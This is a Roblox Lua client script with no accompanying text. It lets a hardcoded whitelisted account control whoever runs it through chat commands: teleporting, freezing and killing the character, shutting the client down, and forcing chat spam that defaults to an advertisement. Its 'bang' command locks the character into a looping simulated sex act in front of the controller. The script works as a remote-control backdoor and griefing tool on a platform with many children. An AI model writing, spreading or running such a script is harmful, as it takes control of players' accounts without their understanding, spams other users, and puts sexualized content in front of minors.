local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local camera = workspace.CurrentCamera

-- Animation Configuration
local EMOTE_ID = 182789003 -- R6 Emote ID
local animationTrack = nil

-- Configuration for Lock/Pulse behavior
local isLocked = false
local lockDistance = 2.5
local lockPulseSpeed = 5
local lockPulseAmplitude = 0.5

local lockConnection
local currentTarget
local humanoidRootPart

-- WHITELIST
local allowedPlayers = {"isiah32"} -- The player who can control this script
local prefix = ":"

local function IsAllowed(playerName)
    for _, name in ipairs(allowedPlayers) do
        if string.lower(name) == string.lower(playerName) then
            return true
        end
    end
    return false
end

-- Function to find the allowed player
local function getAllowedPlayerTarget()
    if not humanoidRootPart then return end
    
    for _, p in pairs(Players:GetPlayers()) do
        if IsAllowed(p.Name) and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            return p.Character.HumanoidRootPart
        end
    end
    
    return nil
end

-- Helper function to play the looped animation
local function playEmote(char)
    if not char then return end
    
    local humanoid = char:FindFirstChild("Humanoid")
    if not humanoid then return end
    
    local animator = humanoid:FindFirstChildOfClass("Animator")
    if not animator then
        animator = Instance.new("Animator")
        animator.Parent = humanoid
    end

    -- Always create a fresh animation instance
    local animation = Instance.new("Animation")
    animation.AnimationId = "rbxassetid://" .. EMOTE_ID
    animation.Name = "FollowEmote"
    
    -- Stop and clean up old track if it exists
    if animationTrack then
        animationTrack:Stop()
        animationTrack:Destroy()
        animationTrack = nil
    end
    
    -- Load new animation track
    animationTrack = animator:LoadAnimation(animation)
    animationTrack.Looped = true
    animationTrack.Priority = Enum.AnimationPriority.Action
    animationTrack:Play()
    
    animation:Destroy()
end

-- Helper function to stop the animation
local function stopEmote()
    if animationTrack then
        if animationTrack.IsPlaying then
            animationTrack:Stop()
        end
        animationTrack:Destroy()
        animationTrack = nil
    end
end

-- Function to cleanly stop the lock
local function stopLock()
    isLocked = false
    
    -- Disconnect the render connection
    if lockConnection then 
        lockConnection:Disconnect()
        lockConnection = nil
    end
    
    -- Stop the animation
    stopEmote()
    
    -- Restore camera
    if player.Character and player.Character:FindFirstChild("Humanoid") then
        camera.CameraSubject = player.Character.Humanoid
    end
    
    print("Unlocked from allowed player")
end

-- Function to start the lock
local function startLock()
    -- Find allowed player
    currentTarget = getAllowedPlayerTarget()
    
    if not currentTarget then
        print("Allowed player not found")
        return false
    end
    
    isLocked = true
    
    -- Clean up any existing connection
    if lockConnection then 
        lockConnection:Disconnect()
        lockConnection = nil
    end
    
    -- Start the animation
    playEmote(player.Character)
    
    print("Locked onto allowed player")
    
    -- Connect to RenderStepped
    lockConnection = RunService.RenderStepped:Connect(function()
        -- Safety checks
        if not isLocked then
            return
        end
        
        if not humanoidRootPart or not humanoidRootPart.Parent then 
            stopLock()
            return
        end
        
        if not currentTarget or not currentTarget.Parent then 
            -- Try to find target again
            currentTarget = getAllowedPlayerTarget()
            if not currentTarget then 
                print("Allowed player lost")
                stopLock()
                return 
            end
        end

        -- Calculate the dynamic distance (forward/backward pulse)
        local pulseFactor = math.cos(tick() * lockPulseSpeed) * lockPulseAmplitude
        local currentDistance = lockDistance + pulseFactor

        -- Target's HumanoidRootPart CFrame
        local targetCFrame = currentTarget.CFrame

        -- Calculate the desired position: in front of the target
        local positionFront = targetCFrame * CFrame.new(0, 0, -currentDistance)

        -- Apply the CFrame
        humanoidRootPart.CFrame = positionFront

        -- Set camera subject to the target
        local targetHumanoid = currentTarget.Parent:FindFirstChild("Humanoid")
        if targetHumanoid then
            camera.CameraSubject = targetHumanoid
        end
    end)
    
    return true
end

-- Setup function for when the player's character spawns
local function onCharacterAdded(char)
    humanoidRootPart = char:WaitForChild("HumanoidRootPart")
    animationTrack = nil 
    
    -- If was locked before respawn, restart lock
    if isLocked then
        task.wait(0.5)
        startLock()
    else
        camera.CameraSubject = char:FindFirstChild("Humanoid")
    end
end

if player.Character then
    onCharacterAdded(player.Character)
end
player.CharacterAdded:Connect(onCharacterAdded)

-- Command Handler
local function GetPlayer(name)
    for _, p in ipairs(Players:GetPlayers()) do
        if string.lower(p.Name):sub(1, #name) == string.lower(name) then
            return p
        end
    end
    return nil
end

local function HandleCommand(playerName, msg)
    msg = msg:lower()
    if string.sub(msg, 1, 3) == "/e " then
        msg = string.sub(msg, 4)
    end

    if string.sub(msg, 1, 1) == prefix then
        local space = string.find(msg, " ")
        local cmd = ""
        local arg = ""
        
        if space then
            cmd = string.sub(msg, 2, space - 1)
            arg = string.sub(msg, space + 1)
        else
            cmd = string.sub(msg, 2)
        end

        if cmd == "bring" then
            local p1 = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
            local p2 = Players:FindFirstChild(playerName)
            if p1 and p2 and p2.Character and p2.Character:FindFirstChild("HumanoidRootPart") then
                p1.CFrame = p2.Character.HumanoidRootPart.CFrame
            end
        elseif cmd == "say" then
            local toSay = arg ~= "" and arg or "Buy Eclipse"
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(toSay, "All")
        elseif cmd == "sit" then
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                player.Character.Humanoid.Sit = true
            end
        elseif cmd == "unsit" then
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                player.Character.Humanoid.Sit = false
            end
        elseif cmd == "kill" then
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                player.Character.Humanoid.Health = 0
            end
        elseif cmd == "kick" then
            game:Shutdown()
        elseif cmd == "freeze" then
            local char = player.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.Anchored = true
                hrp.CFrame = hrp.CFrame + Vector3.new(0, 10, 0)
            end
        elseif cmd == "unfreeze" then
            local char = player.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.Anchored = false
                hrp.CFrame = hrp.CFrame - Vector3.new(0, 10, 0)
            end
        elseif cmd == "goto" and arg ~= "" then
            local target = GetPlayer(arg)
            if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                local targetPos = target.Character.HumanoidRootPart.Position
                local newCFrame = CFrame.new(targetPos)
                local ts = game:GetService("TweenService")
                local char = player.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local ti = TweenInfo.new(1, Enum.EasingStyle.Linear)
                    local tp = { CFrame = newCFrame }
                    ts:Create(hrp, ti, tp):Play()
                end
            end
        elseif cmd == "bang" then
            if not isLocked then
                startLock()
            end
        elseif cmd == "unbang" then
            if isLocked then
                stopLock()
            end
        end
    end
end

local function ConnectCommands(p)
    if IsAllowed(p.Name) then
        p.Chatted:Connect(function(msg)
            HandleCommand(p.Name, msg)
        end)
    end
end

for _, p in ipairs(Players:GetPlayers()) do
    ConnectCommands(p)
end

Players.PlayerAdded:Connect(function(p)
    ConnectCommands(p)
end)
